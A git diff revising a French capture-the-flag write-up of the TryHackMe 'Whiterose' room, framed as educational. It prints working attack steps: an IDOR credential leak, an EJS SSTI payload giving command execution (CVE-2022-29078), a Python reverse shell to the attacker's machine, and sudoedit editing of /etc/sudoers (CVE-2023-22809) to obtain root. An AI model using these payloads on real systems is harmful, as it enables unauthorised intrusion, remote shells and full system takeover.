@@ -1,73 +1,70 @@
-**Whiterose — Walkthrough TryHackMe**  
+# Whiterose — Rapport d’exploitation
 **Room :** Whiterose  
-**Lien :** https://tryhackme.com/room/whiterose  
 **Difficulté :** Facile  
-**Description :**  
-Yet another Mr. Robot themed challenge.
+**Description :** Scénario d’intrusion web et système inspiré de la série Mr. Robot.
 
 # Objectifs pédagogiques
-Cette room permet de travailler plusieurs notions clés en pentest :
+Cette machine permet de mettre en œuvre plusieurs concepts fondamentaux en test d’intrusion :
 - Énumération de services réseau
-- Exploitation d’une IDOR
-- Exploitation SSTI (EJS) → RCE Node.js
-- Élévation de privilèges via sudoedit (CVE)
+- Contrôles d’accès défaillants (IDOR)
+- Server-Side Template Injection (EJS)
+- Exécution de code arbitraire (Node.js / Express)
+- Élévation de privilèges Linux via sudoedit (CVE)
 
-
-⚠️ Ce walkthrough est fourni à des fins éducatives uniquement.
-N’effectuez jamais ces techniques sur des systèmes sans autorisation explicite.
+**⚠️ Ce rapport est fourni à des fins éducatives uniquement.**  
+Toute exploitation de vulnérabilités doit être réalisée dans un cadre légal et autorisé.
 
 # Résumé exécutif
 
-Ce rapport présente l’exploitation complète de la room Whiterose sur TryHackMe.  
-L’objectif est de démontrer une chaîne d’attaque réaliste, depuis une surface web exposée
-jusqu’à une compromission totale du système.
+Ce rapport décrit l’exploitation complète d’un scénario d’intrusion menant d’une surface web exposée à une compromission totale du système.
 
-Chaîne d’exploitation :  
-IDOR → compromission compte admin → SSTI EJS → RCE → élévation de privilèges Linux.
+L’objectif est de démontrer une chaîne d’attaque réaliste menant d’une surface web exposée à une compromission totale du système.
 
-Public visé : Pentester junior / Blue team / Développeur backend.
+### Chaîne d’exploitation :  
+IDOR → compromission d'un compte administrateur → SSTI (EJS) → RCE → élévation de privilèges Linux.
+
+### Public visé : 
+Pentester junior / Blue team / Développeur backend.
 
 # Outils utilisés
 - Nmap
-- Gobuster
+- Gobuster / fuzzing de virtual hosts
 - Burp Suite
 - Netcat
 - Python
 - sudo
 
-# 1. Reconnaissance (Recon)
+# 1. Reconnaissance
 
-Après avoir lancé la machine cible et connecté notre VM au réseau TryHackMe via OpenVPN, nous commençons par une phase de reconnaissance avec Nmap.  
+Après le déploiement de la machine cible et la connexion au réseau via OpenVPN, une phase de reconnaissance est initiée afin d’identifier la surface d’attaque exposée.
 
 ### Objectif  
-Identifier la surface d’attaque :
-- ports ouverts
-- services exposés
-- système d’exploitation
+- Identifier les ports ouverts
+- Déterminer les services accessibles
+- Obtenir des informations sur l’OS et les technologies utilisées
 
 ### Scan réseau : 
-```bash
+``` bash
 nmap -A -p- -T4 IP_CIBLE
 ```
 
 ### Explication des options
-- A : mode agressif (OS detection, traceroute, scripts avancés)
-- -p- : scan de tous les ports (1–65535)
-- T4 : accélère le scan
-- IP_CIBLE : adresse IP de la machine cible
+- `-A` : mode agressif (OS detection, traceroute, scripts avancés)
+- `-p-` : scan de tous les ports (1–65535)
+- `-T4` : accélère le scan
+- `IP_CIBLE` : adresse IP de la machine cible
 
 ![image](https://github.com/user-attachments/assets/6f175acf-1064-4fba-8dec-4ef9ee972cd2)
 
 ### Analyse des services exposés
-Ports ouverts :
-| Port    | Service   | Intérêt |
-|---------|-----------|---------|
-| 22      | SSH       | Accès distant (post-exploitation) |
-| 80     | HTTP   | Site web nginx 1.14.0 potentiellement vulnérable |
+| Port | Service | Description                       |
+| ---- | ------- | --------------------------------- |
+| 22   | SSH     | Accès distant (post-exploitation) |
+| 80   | HTTP    | Serveur web nginx 1.14.0          |
 
 ### Accès au site
 
-L’accès au site redirige vers `cyprusbank.thm`. 
+L’accès au port 80 redirige vers le nom de domaine `cyprusbank.thm`.
 
 ➡️ Ajout dans /etc/hosts :  
 `<IP_CIBLE> cyprusbank.thm`
@@ -81,7 +78,7 @@ Analyse rapide côté client:
 - Aucun commentaire HTML
 - Pas de page robots.txt
 - Peu de ressources chargées
-- Aucun résultat avec une énumération gobuster
+- Aucun résultat intéressant avec une énumération `Gobuster dir`
 
 ➡️ Hypothèse : présence d’un sous-domaine non exposé
 
@@ -89,10 +86,11 @@ Analyse rapide côté client:
 
 ### Recherche de Vhosts
 
+Une énumération des virtual hosts (Host header fuzzing) avec `Gobuster vhost` est réalisée afin d’identifier d’éventuels sous-domaines hébergés sur le serveur web.
+
 ![image](https://github.com/user-attachments/assets/a3968b74-90c4-4fa5-8e24-3e210ca359f4)
 
-Une énumération des virtual hosts révèle :  
-`admin.cyprusbank.thm`
+L'énumération des virtual hosts révèle : `admin.cyprusbank.thm`
 
 ➡️ Ajout dans /etc/hosts puis navigation vers le sous-domaine : 
 `<IP_CIBLE> cyprusbank.thm admin.cyprusbank.thm`
@@ -103,51 +101,68 @@ Le sous-domaine admin.cyprusbank.thm expose une page de connexion.
 
 ![image](https://github.com/user-attachments/assets/b4c265e3-cdf4-499e-95bd-ed4e43cbc23d)
 
-Le challenge met à notre disposition des identifiants `Olivia Cortez : olivi8` fournis que nous pouvons utiliser pour se connecter.
+Des identifiants utilisateurs sont disponibles :  
+```
+Utilisateur : Olivia Cortez 
+Mot de passe : olivi8
+```
 
-La connexion au site est réussie, mais nous avons un accès limité puisque l'endpoint /settings est interdit pour l'utilisateur Olivia Cortez.
+L’authentification est réussie, mais l’accès est restreint :
+- certaines fonctionnalités, notamment l’endpoint /settings, sont inaccessibles
+- les privilèges semblent limités à un rôle utilisateur standard
 
 ![image](https://github.com/user-attachments/assets/9ff1c639-4c06-4f7a-a766-c5745ea205c7)
 
 # 4. IDOR – Accès à des données sensibles
 
-En se rendant sur l'endpoint /messages `/messages/?c=5`, on peut observer qu'il y a un paramètre `c` dans l'url. Ce paramètre est contrôlé côté client.
+En accédant à l’endpoint suivant :  
+`/messages/?c=5`
 
-### Test Insecure Direct Object Reference (IDOR)
-Essayons de changer la valeur du paramètre `c` afin de potiellement révéler des informations dont nous ne disposons pas initialement  :  `/messages/?c=20`
+On observe la présence d’un paramètre `c` utilisé pour identifier des messages.
+
+### Test de contrôle d’accès
+
+En modifiant la valeur du paramètre :
+`/messages/?c=20`
+
+l’application retourne davantage de messages, sans vérifier que l’utilisateur authentifié est autorisé à y accéder.
 
 ![image](https://github.com/user-attachments/assets/58700f39-3a1c-4d07-a361-1ebd86364d0f)
 
-➡️ Résultat :
-Accès à davantage de messages
+### Résultat :
+Cette manipulation permet l’accès à d'autres messages révélant des données sensibles appartenant à d’autres utilisateurs, notamment des identifiants de connexion.
 
-Cette manipulation révèle une divulgation d’identifiants sensibles : `Gayle Bev : REDACTED`
+```
+Utilisateur : Gayle Bev 
+Mot de passe : REDACTED
+```
 
 **Impact sécurité :**  
-Cette vulnérabilité permet à un utilisateur authentifié d’accéder à des ressources ne lui appartenant pas,
-entraînant une fuite d’informations sensibles et facilitant la compromission de comptes à privilèges élevés.
+Cette vulnérabilité de type Insecure Direct Object Reference (IDOR) permet à un utilisateur authentifié d’accéder à des ressources qui ne lui appartiennent pas, entraînant une fuite d’informations sensibles, une compromission potentielle de comptes à privilèges élevés et un élargissement de la surface d’attaque.
 
 # 5. Compte administrateur & surface d’attaque élargie
 
-À ce stade, nous disposons d’un accès administrateur à l’application web, ce qui élargit considérablement la surface d’attaque côté serveur.
+Les identifiants divulgués via l’IDOR permettent l’accès à un compte disposant de privilèges administrateur, ce qui élargit considérablement la surface d’attaque côté serveur.
 
-On a maintenant accès à l’endpoint /settings et il devient possible de modifier les mots de passe des utilisateurs.
+Cet accès donne notamment :
+- la possibilité de modifier les mots de passe utilisateurs
+- l’accès à l’endpoint `/settings`
 
-Les mots de passe sont réinjectés côté serveur dans la réponse HTML.  
+Les données saisies dans les formulaires sont réinjectées dans la réponse HTML côté serveur, ce qui constitue un indicateur fort de rendu dynamique via un moteur de templates.
+
+➡️ Hypothèse : présence d’une vulnérabilité de type Server-Side Template Injection (SSTI).
 
 ![image](https://github.com/user-attachments/assets/8469acb1-dd86-441b-807c-0183bded15f0)
 
-➡️ Indice fort de SSTI (rendu serveur)
-
 # 6. Server-Side Template Injection (SSTI)
 
-A l'aide de l'outil Burp Suite, on peut intercepter une requête de modification de mot de passe.
+À l’aide de Burp Suite, une requête de modification de mot de passe est interceptée et modifiée.
 
 ![image](https://github.com/user-attachments/assets/edacb276-9c6d-4cbf-99d3-4f95f873bd86)
 
 ### Analyse de l’erreur serveur
 
-En supprimant le paramètre `password`, l’application retourne une stack trace complète.
+En supprimant le paramètre `password`, le serveur retourne une erreur interne accompagnée d’une stack trace complète.
 
 ![image](https://github.com/user-attachments/assets/38d92b8e-ac37-4116-876d-28deec32b163)
 
@@ -184,23 +199,27 @@ password is not defined
   at runMicrotasks (<anonymous>)
 ```
 
-Informations critiques divulguées :
+Informations divulguées
 - Backend : Node.js / Express
-- Template engine : EJS
-- Chemins internes exposés
+- Moteur de templates : EJS
+- Chemins internes du serveur
+- Logique applicative
 
-➡️ Confirmation d’un bug applicatif exploitable
+Cette divulgation confirme :
+- une mauvaise gestion des erreurs
+- un risque élevé d’exploitation SSTI
+
+➡️ Confirmation d’une vulnérabilité exploitable menant à une exécution de code arbitraire.
 
 # 7. Validation de la SSTI → RCE (CVE-2022-29078)
 
-L’exploitation est rendue possible par une mauvaise configuration d’Express exposant les `view options`, et non par EJS seul.
+L’exploitation est rendue possible par une mauvaise configuration d’Express exposant les `view options`, combinée à l’utilisation du moteur EJS.
 
-De nombreuses ressources sur Internet parlent de la CVE-2022-29078 permettant d'obtenir une exécution de code arbitraire à partir d'une vulnérabilité SSTI :
+Cette configuration vulnérable est documentée, notamment dans le cadre de CVE-2022-29078 :
 - https://github.com/mde/ejs/issues/720
 - https://eslam.io/posts/ejs-server-side-template-injection-rce/
 
-Payload de test SSTI (via Burp Suite) :
-
+### Payload de validation
 ``` text
 settings[view options][outputFunctionName]=x;
 process.mainModule.require('child_process')
@@ -208,17 +227,20 @@ process.mainModule.require('child_process')
 s
 ```
 
+<!--
 ![image](https://github.com/user-attachments/assets/9a31ed45-006d-4180-af08-688cc6c392ad)
+# A modifier!
+-->
 
-➡️ Callback reçu  
+➡️ Le résultat de la commande est renvoyé côté serveur, confirmant l’exécution de code arbitraire.  
 ✅ Exécution de commandes confirmée
 
 **Impact sécurité :**  
-La vulnérabilité SSTI permet à un attaquant authentifié d’exécuter du code arbitraire côté serveur, aboutissant à une compromission complète de l’application et du système sous-jacent.
+Cette vulnérabilité permet à un attaquant authentifié d’exécuter des commandes arbitraires sur le serveur, entraînant une compromission complète de l’application et du système sous-jacent.
 
 # 8. Obtention d’un reverse shell
 
-La SSTI EJS confirmée permettant l’exécution de commandes arbitraires, il est possible d’invoquer directement Python afin d’établir un reverse shell vers la machine attaquante, sans déposer de fichier sur la cible.
+L’exécution de commandes arbitraires via la SSTI EJS permet l’établissement d’un reverse shell via Python, sans dépôt de fichier sur la machine cible.
 
 ### Payload utilisé
 
@@ -235,15 +257,17 @@ os.dup2(s.fileno(),2);
 pty.spawn(\"sh\")'"
 );
 ```
-Le reverse shell est exécuté directement via Python,
-sans téléchargement ni écriture de fichier sur la machine cible, afin de réduire les traces laissées sur le système.
+
+Cette technique suppose la présence de Python3 sur la machine cible, ce qui est courant sur de nombreuses distributions Linux.
 
 Ce payload ouvre une connexion TCP vers la machine attaquante, redirige les entrées/sorties standard vers le socket, puis ouvre un shell interactif via `pty`, assurant une session stable.
 
-➡️ Obtention et stabilisation du shell 
+➡️ Un shell interactif est obtenu et stabilisé.
 
+<!--
 ![image](https://github.com/user-attachments/assets/e862b1c2-9371-43c6-8add-33cc70ba0e8d)
-
+A modifier
+-->
 
 **Impact sécurité :**  
 L’exécution de commandes arbitraires permet à un attaquant d’obtenir un accès interactif au système,
@@ -253,7 +277,7 @@ ouvrant la voie au vol de données, à l’installation de portes dérobées et 
 
 Utilisateur courant : web
 
-Flag trouvé dans le répertoire `/home/web/user.txt`
+Le flag utilisateur est localisé dans : `/home/web/user.txt`
 
 # 10. Élévation de privilèges – sudoedit (CVE-2023-22809)
 
@@ -262,22 +286,26 @@ La commande `sudo -l` liste tout ce que l’utilisateur web peut exécuter avec 
 
 ![image](https://github.com/user-attachments/assets/549edde0-3acd-4571-ae35-6f200a31c15f)
 
-### Résultat :
-L’utilisateur web peut modifier un fichier de configuration Nginx en tant que root, sans mot de passe.
+Résultat :
+- l’utilisateur web peut modifier un fichier de configuration Nginx via sudoedit
+- aucun mot de passe n’est requis
 
-Version sudo : 1.9.12p1  
-➡️ Version vulnérable à CVE-2023-22809
+Version de sudo :
+`sudo 1.9.12p1`
+
+➡️ Cette version est vulnérable à CVE-2023-22809.
 
 # 11. Exploitation de sudoedit (sudo -e)
 
+Cette vulnérabilité permet à un utilisateur disposant d’un accès sudoedit limité de modifier arbitrairement des fichiers système en tant que root.
+
 ### Principe
-sudoedit permet d’injecter des arguments via la variable EDITOR.
+La vulnérabilité CVE-2023-22809 affecte la commande sudoedit et permet à un utilisateur disposant d’un accès sudoedit restreint de modifier arbitrairement des fichiers système avec les privilèges root.
 
-Essentiellement, sudoedit permet aux utilisateurs de choisir leur éditeur à l'aide de variables d'environnement telles que SUDO_EDITOR, VISUAL ou EDITOR. Étant donné que les valeurs de ces variables peuvent être non seulement l'éditeur lui-même, mais aussi les arguments à passer à l'éditeur choisi, sudo utilise -- lors de leur analyse pour séparer l'éditeur et ses arguments des fichiers à ouvrir pour modification.
+Cette faille repose sur la possibilité de définir des variables d’environnement telles que EDITOR, VISUAL ou SUDO_EDITOR avec des arguments supplémentaires.
+En injectant l’argument --, il est possible de contourner les restrictions imposées par sudoedit et d’ouvrir des fichiers autres que ceux explicitement autorisés par la configuration sudo.
 
-Cela signifie qu'en utilisant l'argument -- dans les variables d'environnement de l'éditeur, nous pouvons le forcer à ouvrir d'autres fichiers que ceux autorisés dans la commande sudoedit que nous pouvons exécuter. Par conséquent, comme nous pouvons exécuter sudoedit en tant que root avec sudo, nous pouvons modifier n'importe quel fichier que nous voulons en tant que root.
-
-Pour utiliser cette vulnérabilité à des fins d'élévation de privilèges, nous pouvons écrire dans de nombreux fichiers. Dans ce cas, nous pouvons simplement choisir d'écrire dans le fichier /etc/sudoers pour nous accorder tous les privilèges sudo.
+Dans ce contexte, l’utilisateur web étant autorisé à utiliser sudoedit en tant que root, cette vulnérabilité permet la modification de fichiers critiques du système, notamment /etc/sudoers, menant à une élévation de privilèges complète.
 
 Plus d'informations détaillées à ce sujet dans cet avis de sécurité publié par Synacktiv (https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)
 
@@ -288,9 +316,9 @@ export EDITOR="nano -- /etc/sudoers"
 sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
 ```
 
-Le fichier `/etc/sudoers` s'ouvre avec nano.
+Le fichier `/etc/sudoers` est alors modifiable.
 
-En ajoutant `web ALL=(ALL) NOPASSWD: ALL` au fichier, nous pouvons accorder à notre utilisateur actuel tous les privilèges sudo.
+En ajoutant `web ALL=(ALL) NOPASSWD: ALL` au fichier, l’utilisateur courant obtient des privilèges sudo complets.
 
 ![image](https://github.com/user-attachments/assets/36834f4c-cb6c-482a-ab68-5c0862ba3af7)
 
@@ -299,33 +327,29 @@ La mauvaise configuration de sudo, combinée à une version vulnérable, permet 
 
 # 12. Accès root
 
-Après avoir enregistré le fichier, nous pouvons voir les modifications apportées à nos privilèges sudo.
+Les nouveaux privilèges permettent l’obtention d’un shell root :  
+`sudo su -`
 
-![image](https://github.com/user-attachments/assets/866d94a7-3c15-449f-97c3-66dbcbd26b2a)
-
-
-Enfin, en exécutant simplement sudo `sudo su -`, nous pouvons obtenir un shell en tant qu'utilisateur root et lire le drapeau root dans /root/root.txt.
-
-➡️ Accès root obtenu  
-➡️ Flag : /root/root.txt
+Le flag root est accessible dans :  
+`/root/root.txt`
 
 # Conclusion & compétences démontrées
 
 ### Vulnérabilités exploitées
 - IDOR
-- SSTI (EJS) → RCE (CVE-2022-29078)
+- SSTI (EJS / Express) → RCE (CVE-2022-29078)
 - Mauvaise configuration sudo
 - CVE-2023-22809 (sudoedit)
 
 ### Compétences mises en avant
-- Méthodologie pentest
-- Web exploitation
-- Lecture de stack trace
-- Exploitation Node.js / EJS
-- Privilege escalation Linux
+- Méthodologie de test d’intrusion
+- Exploitation web
+- Analyse de stack traces
+- Exploitation Node.js
+- Élévation de privilèges Linux
 
 ### Recommandations de sécurité
-- Implémenter des contrôles d’accès côté serveur pour prévenir les IDOR
-- Ne jamais exposer les `view options` d’Express
+- Implémenter des contrôles d’accès côté serveur
+- Restreindre l’exposition des view options d’Express
 - Désactiver les stack traces en production
 - Mettre à jour sudo et limiter l’usage de sudoedit
